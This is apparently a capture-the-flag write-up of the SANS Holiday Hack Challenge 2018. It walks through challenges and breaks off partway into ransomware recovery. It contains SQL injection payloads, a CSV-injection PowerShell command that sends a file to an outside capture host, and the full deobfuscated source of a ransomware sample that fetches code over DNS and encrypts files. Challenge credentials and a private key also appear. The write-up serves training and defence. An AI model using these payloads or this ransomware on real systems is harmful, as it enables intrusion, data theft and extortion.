MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM
MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM
MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM
MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM
MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM
M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM
MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM
MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM
MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M
MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM
MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations!
```


## Security challenges

#### Orientation Challenge (Kringle History Kiosk)

This challenge asks a number of questions about prior years' challenges - if you played them the answers will be easy to come up with. 

If not here is a cheat sheet:

- Firmware
- ATNAS
- Business Card
- Cranberry Pi
- Snowballs
- The Great Book

When the right answers are selected a secret phrase ```Happy Trails``` is revealed.

#### de Bruijn Sequences

To solve this challenge we need to find the passcode to break into the Speaker Unpreparedness Room. Because of the way the code pad is built we can use de Bruijn Sequences to quickly bruteforce the code.

![]({{ site.baseurl }}/images/sans2018/debruijn.png)

We can assign values 0 through 3 to buttons on the keypad (i.e. triangle will be 0, square will be 1, etc.) and use a [de Bruijn tool](http://www.hakank.org/comb/debruijn.cgi) to generate the corresponding sequence (the alphabet size is 4, sequence length is 4). Once we try all the sequences the door will open and we can enter the room. 

The elf that stands in the room greets us with ```Welcome unprepared speaker!```

#### Directory Browsing

This is a fairly easy challenge - when we go to the [provided site](https://cfp.kringlecastle.com) we do not see anything interesting, but browsing directories directly reveals an interesting CSV file:

```
GET https://cfp.kringlecastle.com/cfp/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Host: cfp.kringlecastle.com

HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Mon, 14 Jan 2019 19:12:00 GMT
Content-Type: text/html
Connection: keep-alive

<html>
<head><title>Index of /cfp/</title></head>
<body bgcolor="white">
<h1>Index of /cfp/</h1><hr><pre><a href="../">../</a>
<a href="cfp.html">cfp.html</a>                                           08-Dec-2018 13:19                3391
<a href="rejected-talks.csv">rejected-talks.csv</a>                                 08-Dec-2018 13:19               30677
</pre><hr></body>
</html>
```

In the list of rejected talks the talk titled "Data Loss for Rainbow Teams: A Path in the Darkness?" was submitted by ```John McClane``` (I can't imagine a better candidate).

#### Data Repo Analysis

In this challenge we have to download a ZIP file from a Git repository and find a password to open it. According to the hints ```trufflehog``` is the tool to use:

```
$ git clone https://git.kringlecastle.com/Upatree/santas_castle_automation.git
Cloning into 'santas_castle_automation'...
remote: Enumerating objects: 949, done.
remote: Counting objects: 100% (949/949), done.
remote: Compressing objects: 100% (545/545), done.
remote: Total 949 (delta 258), reused 879 (delta 205)
Receiving objects: 100% (949/949), 4.27 MiB | 3.11 MiB/s, done.
Resolving deltas: 100% (258/258), done.
Checking out files: 100% (2966/2966), done.

$ trufflehog santas_castle_automation/ | grep -i -E "password\s*=\s*"
+Password = 'Yippee-ki-yay'
+Password = 'Yippee-ki-yay'
-Password = 'Yippee-ki-yay'
-Password = 'Yippee-ki-yay'
```

When we load file ```schematics/ventilation_diagram.zip``` and open it using this password we will find maps of ventilation ducts (which will be useful later in Google Ventilation Maze).

#### AD Privilege Discovery

To find a path to the Domain Admins group in this challenge we need to download and run supplied Linux image. Then run Bloodhound tool and from the prebuilt queries select ```Shortest Paths to Domain Admins from Kerberoastable Users```.

![]({{ site.baseurl }}/images/sans2018/bloodhound.png)

In the resulting tree of paths we can only select a route that does not contain RDP, which results in a single choice: ```LDUBEJ00320@AD.KRINGLECASTLE.COM```.

#### Badge Manipulation

![]({{ site.baseurl }}/images/sans2018/qrcode.png)

To reach a locked room in the back of the castle we need to use a badge with QR code. For me the easiest way to do that was to use a QR-generating website like [http://goqr.me/](http://goqr.me/) on a mobile phone, and then hold the phone screen with QR code to the computer camera (the badge reader will read the camera feed if you give it permission).

We start by playing around with the different values that we can submit and it is quickly revealed that the reader is vulnerable to SQL injection. By submitting the value ```1' or 1=1--``` we get the following response:

```
HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Mon, 24 Dec 2018 05:53:16 GMT
Content-Type: application/json
Content-Length: 356
Connection: keep-alive

{"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1\")","request":false}
```

Apparently we need the values with ```enabled``` flag turned on, so let's submit QR code for ```' or 1=1 and enabled=1; #```:

```
HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Mon, 24 Dec 2018 06:13:22 GMT
Content-Type: application/json
Content-Length: 210
Connection: keep-alive

{"data":"User Access Granted - Control number 19880715","request":true,"success":{"hash":"15a8252096dc95f6c430e7422fcf68c678b2fbd45f985f43319cf4f926b6558c","resourceId":"e3efa955-7382-4c3b-aa9a-fb88b68bc6f0"}}
```

The access is now granted and we can enter the locked room.

#### HR Incident Response

Before attampting to solve challenges in this new room let's solve the other objectives on our conference badge. Solving challenges in sequence makes solutions easier (learned the hard way...).

For the HR Incident Response challenge we have to exfiltrate file ```C:\candidate_evaluation.docx``` from  [https://careers.kringlecastle.com/](https://careers.kringlecastle.com/).

We know that this challenge should be vulnerable to CSV injection. To exploit it let's set up a temporary account with a public HTTP capture service like [https://hookb.in/](https://hookb.in/). We can then submit the following CSV to grab the document we need, and exfiltrate it to the site:

```
"=cmd|'/c powershell.exe -executionpolicy bypass -command {$p=[System.Convert]::ToBase64String([IO.File]::ReadAllBytes(""C:\candidate_evaluation.docx""));Invoke-WebRequest -Uri https://hookb.in/r1XwNLmOmRhj61dpaYVP -Method POST -Body $p}'!b1",a,a,a,a,a,a,a,a,a,a,a,a
```

The document will come to HookBin Base64-encoded, so once we decode it we can open it in Word. It contains a number of job applicant evaluations.

In the challenge we are asked to provide the name of the group supported by the candidate whose name starts with 'K'. The candidate name turns out to be ```Krampus``` and the group name is ```Fancy Beaver```.

#### Network Traffic Forensics

In this challenge we are interacting with a [Packalyzer web site](https://packalyzer.kringlecastle.com/) - a packet analysis tool.

Based on hints and site analysis we can find [one of the source code files](https://packalyzer.kringlecastle.com:80/app.js) for the site. We know that we need to find captured SSL keys, but the name of the file that contains them remains a mystery. Close inspection of the code reveals these interesting snippets:

```javascript
const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )

...

function load_envs() {
  var dirs = []
  var env_keys = Object.keys(process.env)
  for (var i=0; i < env_keys.length; i++) {
    if (typeof process.env[env_keys[i]] === "string" ) {
      dirs.push(( "/"+env_keys[i].toLowerCase()+'/*') )
    }
  }
  return uniqueArray(dirs)
}
if (dev_mode) {
    //Can set env variable to open up directories during dev
    const env_dirs = load_envs();
} else {
    const env_dirs = ['/pub/','/uploads/'];
}
```

Essentially this code sets up ```sslkeylogfile``` as one of the allowed folders on the site, but when we reference it it leaks the actual value of ```SSLKEYLOGFILE``` environment variable in the error message:

Request to ```https://packalyzer.kringlecastle.com/sslkeylogfile/aaa/``` returns the following error message:

```
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/aaa'
```

So the name of the key log file is ```packalyzer_clientrandom_ssl.log```. When we download it and set it up in Wireshark (as described in one of the presentations) we can decrypt HTTP2 conversations that the site captures.

In the decrypted responses there are a number of credentials:

```
{"username": "bushy", "password": "Floppity_Floopy-flab19283"}
{"username": "alabaster", "password": "Packer-p@re-turntable192"}
{"username": "pepper", "password": "Shiz-Bamer_wabl182"}
```

After trying these credentials on the site we eventually find ```super_secret_packet_capture.pcap``` among saved PCAPs. Inside is a mail capture with a PDF attachment that describes how to use a piano keyboard (this will be useful later). It also references a tune ```Mary Had a Little Lamb```.

#### Ransomware Recovery

![]({{ site.baseurl }}/images/sans2018/malware.png)

This is the toughest challenge in KringleCon. In the room guarded by the badge scanner there are several computers, apparently infected by malware. We need to recover from it.

First we need to build Snort rules to identify the malware:

```
  _  __     _             _       _____          _   _      
 | |/ /    (_)           | |     / ____|        | | | |     
 | ' / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___ 
 |  < | '__| | '_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \
 | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/
 |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|
             / ____| __/ |          | |                     
            | (___  |___/  ___  _ __| |_                    
             \___ \| '_ \ / _ \| '__| __|                   
             ____) | | | | (_) | |  | |_                    
            |_____/|_|_|_|\___/|_|_  \__|                   
               |_   _|  __ \ / ____|                        
                 | | | |  | | (___                          
         _____   | | | |  | |\___ \        __               
        / ____| _| |_| |__| |____) |      /_ |              
       | (___  |_____|_____/|_____/ _ __   | |              
        \___ \ / _ \ '_ \/ __|/ _ \| '__|  | |              
        ____) |  __/ | | \__ \ (_) | |     | |              
       |_____/ \___|_| |_|___/\___/|_|     |_|              

============================================================
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your 
  job is to configure snort to alert on ONLY the bad 
  ransomware traffic.

GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap

COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the 
  system will notify you of your success.
  
  Check out ~/more_info.txt for additional information.

elf@129b90a6c30d:~$ more more_info.txt 
MORE INFO:
  A full capture of DNS traffic for the last 30 seconds is 
  constantly updated to:

  /home/elf/snort.log.pcap

  You can also test your snort rule by running:

  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf

  This will create an alert file at ~/snort_logs/alert

  This sensor also hosts an nginx web server to access the 
  last 5 minutes worth of pcaps for offline analysis. These 
  can be viewed by logging into:

  http://snortsensor1.kringlecastle.com/

  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf

  tshark and tcpdump have also been provided on this sensor.

HINT: 
  Malware authors often user dynamic domain names and 
  IP addresses that change frequently within minutes or even 
  seconds to make detecting and block malware more difficult.
  As such, its a good idea to analyze traffic to find patterns
  and match upon these patterns instead of just IP/domains.
```

We use the credentials provided above to log into the site and download the latest PCAP file capturing the traffic. In the PCAP the messages relating to malware all contain string ```77616E6E61636F6F6B69652E6D696E2E707331```, so we can build the following snort rule:

```
alert udp any any -> any any (msg:"Malware"; content:"77616E6E61636F6F6B69652E6D696E2E707331"; sid:1;)
```

Next we are given a link to a [malicious document](https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip) that we have to analyze.

We will use the ```olevba``` to extract the macros from it:

```visualbasic
Sub AutoOpen()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub
```

When we decode it the encoded part of it becomes the following PowerShell script (after some cleanup):

```powershell
function H2A($a) {
	$o; 
	$a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; 
	return $o
}; 
$f = "77616E6E61636F6F6B69652E6D696E2E707331"; 
$h = ""; 
foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
	$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings
}; 
iex($(H2A $h | Out-string))
```

The malicious domain malware communicates with is ```Erohetfanu.com```.

It downloads and executes another script - let's carefully retrieve and clean it up:

```powershell
$functions = {
function e_d_file($key, $File, $enc_it) 
{
	[byte[]]$key = $key;
	$Suffix = "`.wannacookie";
	[System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
	[System.Int32]$KeySize = $key.Length*8;
	$AESP = New-Object 'System.Security.Cryptography.AesManaged';
	$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
	$AESP.BlockSize = 128;
	$AESP.KeySize = $KeySize;
	$AESP.Key = $key;
	$FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
	if ($enc_it) {
		$DestFile = $File + $Suffix
	} else {
		$DestFile = ($File -replace $Suffix)
	};
	$FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
	if ($enc_it) {
		$AESP.GenerateIV();
		$FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
		$FileSW.Write($AESP.IV, 0, $AESP.IV.Length);
		$Transform = $AESP.CreateEncryptor()
	} else {
		[Byte[]]$LenIV = New-Object Byte[] 4;
		$FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
		$FileSR.Read($LenIV,  0, 4) | Out-Null;
		[Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);
		[Byte[]]$IV = New-Object Byte[] $LIV;
		$FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
		$FileSR.Read($IV, 0, $LIV) | Out-Null;
		$AESP.IV = $IV;
		$Transform = $AESP.CreateDecryptor()
	};
	$CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
	[Int]$Count = 0;
	[Int]$BlockSzBts = $AESP.BlockSize / 8;
	[Byte[]]$Data = New-Object Byte[] $BlockSzBts;
	Do {
		$Count = $FileSR.Read($Data, 0, $BlockSzBts);
		$CryptoS.Write($Data, 0, $Count)
	} While ($Count -gt 0);
	$CryptoS.FlushFinalBlock();
	$CryptoS.Close();
	$FileSR.Close();
	$FileSW.Close();
	Clear-variable -Name "key";
	Remove-Item $File
};

function H2B {param($HX);$HX = $HX -split '(..)' | ? { $_ };ForEach ($value in $HX){[Convert]::ToInt32($value,16)}};

function A2H(){Param($a);$c = '';$b = $a.ToCharArray();;Foreach ($element in $b) {$c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))};return $c -replace ' '};

function H2A() {Param($a);$outa;$a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_};return $outa};

function B2H {param($DEC);$tmp = '';ForEach ($value in $DEC){$a = "{0:x}" -f [Int]$value;if ($a.length -eq 1){$tmp += '0' + $a} else {$tmp += $a}};return $tmp};

function ti_rox {param($b1, $b2);$b1 = $(H2B $b1);$b2 = $(H2B $b2);$cont = New-Object Byte[] $b1.count;if ($b1.count -eq $b2.count) {for($i=0; $i -lt $b1.count ; $i++) {$cont[$i] = $b1[$i] -bxor $b2[$i]}};return $cont};

function B2G {param([byte[]]$Data);Process {$out = [System.IO.MemoryStream]::new();$gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);$gStream.Write($Data, 0, $Data.Length);$gStream.Close();return $out.ToArray()}};

function G2B {param([byte[]]$Data);Process {$SrcData = New-Object System.IO.MemoryStream( , $Data );$output = New-Object System.IO.MemoryStream;$gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);$gStream.CopyTo( $output );$gStream.Close();$SrcData.Close();[byte[]] $byteArr = $output.ToArray();return $byteArr}};

function sh1([String] $String) {$SB = New-Object System.Text.StringBuilder;[System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{[Void]$SB.Append($_.ToString("x2"))};$SB.ToString()};

function p_k_e($key_bytes, [byte[]]$pub_bytes){$cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;$cert.Import($pub_bytes);$encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);return $(B2H $encKey)};

function e_n_d {
	param($key, $allfiles, $make_cookie );
	$tcount = 12;
	for ( $file=0; $file -lt $allfiles.length; $file++  ) {
		while ($true) {
			$running = @(Get-Job | Where-Object { $_.State -eq 'Running' });
			if ($running.Count -le $tcount) {
				Start-Job  -ScriptBlock {
					param($key, $File, $true_false);
					try{
						e_d_file $key $File $true_false
					} catch {
						$_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
					}
				} -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
				break
			} else {
				Start-Sleep -m 200;
				continue
			}
		}
	}
};

function g_o_dns($f) {$h = '';foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {$h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings};return (H2A $h)};

function s_2_c($astring, $size=32) {$new_arr = @();$chunk_index=0;foreach($i in 1..$($astring.length / $size)) {$new_arr += @($astring.substring($chunk_index,$size));$chunk_index += $size};return $new_arr};

function snd_k($enc_k) {
	$chunks = (s_2_c $enc_k );
	foreach ($j in $chunks) {
		if ($chunks.IndexOf($j) -eq 0) {
			$n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
		} else {
			$(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
		}
	};
	return $n_c_id
};

function wanc {
	$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
	if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {
		return
	};
	if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {
		return
	};
	$p_k = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );
	$b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00});
	$h_k = $(B2H $b_k);
	$k_h = $(sh1 $h_k);
	$p_k_e_k = (p_k_e $b_k $p_k).ToString();
	$c_id = (snd_k $p_k_e_k);
	$d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
	[array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});
	e_n_d $b_k $f_c $true;
	Clear-variable -Name "h_k";
	Clear-variable -Name "b_k";
	$lurl = 'http://127.0.0.1:8080/';
	$html_c = @{'GET /'  =  $(g_o_dns (A2H "source.min.html"));
				'GET /close'  =  '<p>Bye!</p>'};
	Start-Job -ScriptBlock{param($url);
	Start-Sleep 10;
	Add-type -AssemblyName System.Windows.Forms;
	start-process "$url" -WindowStyle Maximized;
	Start-sleep 2;
	[System.Windows.Forms.SendKeys]::SendWait("{F11}")} -Arg $lurl;
	$list = New-Object System.Net.HttpListener;
	$list.Prefixes.Add($lurl);
	$list.Start();
	try {
		$close = $false;
		while ($list.IsListening) {
			$context = $list.GetContext();
			$Req = $context.Request;
			$Resp = $context.Response;
			$recvd = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath;
			if ($recvd -eq 'GET /') {
				$html = $html_c[$recvd]
			} elseif ($recvd -eq 'GET /decrypt') {
				$akey = $Req.QueryString.Item("key");
				if ($k_h -eq $(sh1 $akey)) {
					$akey = $(H2B $akey);
					[array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname});
					e_n_d $akey $f_c $false;
					$html = "Files have been decrypted!";
					$close = $true
				} else {
					$html = "Invalid Key!"
				}
			} elseif ($recvd -eq 'GET /close') {
				$close = $true;
				$html = $html_c[$recvd]
			} elseif ($recvd -eq 'GET /cookie_is_paid') {
				$c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings;
				if ( $c_n_k.length -eq 32 ) {
					$html = $c_n_k
				} else {
					$html = "UNPAID|$c_id|$d_t"
				}
			} else {
				$Resp.statuscode = 404;
				$html = '<h1>404 Not Found</h1>'
			};
			$buffer = [Text.Encoding]::UTF8.GetBytes($html);
			$Resp.ContentLength64 = $buffer.length;
			$Resp.OutputStream.Write($buffer, 0, $buffer.length);
			$Resp.Close();
			if ($close) {
				$list.Stop();
				return
			}
		}
	} finally {
		$list.Stop()
	}
};

wanc;
```

The malware has a built-in killswitch. To decode it let's run the following PowerShell snippet (it uses some other functions from the script above):

```powershell
$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
Write-Host $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString()
```

The domain turns out to be ```yippeekiyaa.aaay``` - we will register it to stop the malware.

The final thing that is left to do is to recover the password from the encrypted password vault. We are given a file with a [memory dump and an encrypted password vault](https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip) to help with that.

As we take a closer look at the script we can see that DNS communications can be used to retrieve files from C&C server. Function ```g_o_dns``` is already used to get ```server.crt``` (```7365727665722E637274```). With a bit of guessing we can use it to get the private key - ```server.key```:

```
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----
```

We have the private key, now we need the encrypted representation of the symmetric key. It can be recovered from the PowerShell memory dump using Power Dump:

```
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
```

With the private key and the encrypted symmetric key we can recover original symmetric key:

```
$ openssl rsautl -decrypt -in encrypted_key.dat -out decrypted_key.dat -inkey server.key -oaep
```

The key is ```FBCFC121915D99CC20A3D3D5D84F8308```.

Now let's modify the malicious script to decrypt our encrypted password vault:

```powershell
$key = "FBCFC121915D99CC20A3D3D5D84F8308";

function e_d_file($key, $File, $enc_it) 
{
	[byte[]]$key = $key;
	$Suffix = "`.wannacookie";
	[System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
	[System.Int32]$KeySize = $key.Length*8;
	$AESP = New-Object 'System.Security.Cryptography.AesManaged';
